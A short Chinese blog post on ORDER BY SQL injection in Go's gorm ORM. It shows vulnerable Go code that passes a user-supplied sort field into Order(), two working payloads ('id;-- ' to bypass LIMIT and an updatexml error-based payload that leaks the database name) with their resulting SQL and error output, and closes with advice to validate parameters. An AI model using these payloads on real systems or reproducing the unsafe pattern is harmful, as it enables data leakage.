---
title: gorm OrderBy注入
date: 2022-03-15 15:40:41.554
updated: 2022-03-15 15:53:18.187
url: https://p00q.cn/?p=547
categories: 
- 数据库
tags: 
- Go
- MySQL
- gorm
- sql
---

# 环境代码
有时为了方便前端排序可能会将`order`作为参数传入，这是不安全的。

虽然gorm有防注入但还是有些方法是没有转义的。
[gorm不安全的方法](https://gorm.io/zh_CN/docs/security.html)

```go
func TestGetList(pageNum, pageSize int, order string) []modle.Test {
	if pageSize == 0 {
		pageSize = 20
	}
	if pageNum == 0 {
		pageNum = 1
	}
	begin := db.GetDB()
	tests := make([]modle.Test, 0)
	err := begin.Model(&modle.Test{}).Order(order).Offset((pageNum - 1) * pageSize).Limit(pageSize).Find(&tests).Error
	if err != nil {
		log.Println(err.Error())
	}

	return tests
}

```

## 爆出符合条件的所有数据
请求：
```
{
    "order":"id;-- "
}
```
执行sql 
```
SELECT * FROM `test` ORDER BY id;--  LIMIT 20
```
返回：符合条件的所有数据

## updatexml
如果有报错回显的话还可能造成更多泄露
请求：
```
{
    "order":"updatexml(1,if(1=2,1,concat(0x7e,database(),0x7e)),1)"
}
```
日志：
```
Error 1105: XPATH syntax error: '~test~'
```
# 建议
在使用前校验参数